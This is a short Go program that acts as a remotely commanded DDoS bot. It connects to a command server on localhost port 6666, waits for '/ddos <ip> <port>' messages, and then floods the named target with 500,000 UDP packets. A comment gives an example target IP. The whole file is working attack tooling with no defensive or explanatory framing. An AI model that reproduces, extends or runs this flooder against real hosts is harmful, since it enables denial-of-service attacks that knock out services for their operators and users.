package main

import (
	"fmt"
	"net"
	"strings"
)

func CreateDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
	serverAddr, err := net.ResolveUDPAddr("udp", address+":"+port)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	return data, serverAddr
}

func sendUdp(data string, serverAddr *net.UDPAddr) {
	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
	defer conn.Close()

	_, err = conn.Write([]byte(data))

	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
}

func udpFlood(host string, port string) {
	udpString := "pkg"
	fmt.Println("[DOS] - Processing")
	for i := 1; i <= 500_000; i++ {
		data, serverAddr := CreateDatagramm(udpString, host, port)
		sendUdp(data, serverAddr)
	}
}
func getIpPort(str string) (string, string) {

	cmdList := strings.Split(str, " ")

	ip := cmdList[1]

	if len(cmdList) > 2 {
		port := cmdList[2]

		return ip, port
	}
	return "None", "None"
}
func getSourceParram(cmd string) (string, error) {
	paramsList := strings.Split(cmd, " ")

	return paramsList[0], nil
}

// DDOS cmd -> DDOS 163.217.31.78 8888
func source(cmd string) {
	cmdParam, _ := getSourceParram(cmd)

	fmt.Println(cmd)

	switch cmdParam {
	case "/ddos":
		ip, port := getIpPort(cmd)
		udpFlood(ip, port)

	}
}

func main() {
	conn, _ := net.Dial("tcp", "localhost:6666")
	buffer := make([]byte, 1024)

	for {
		n, err := conn.Read(buffer)
		req := string(buffer[:n])

		if err != nil {
			fmt.Println("[Err] -> Connection error in 57 line")
		}

		source(req)
	}
}
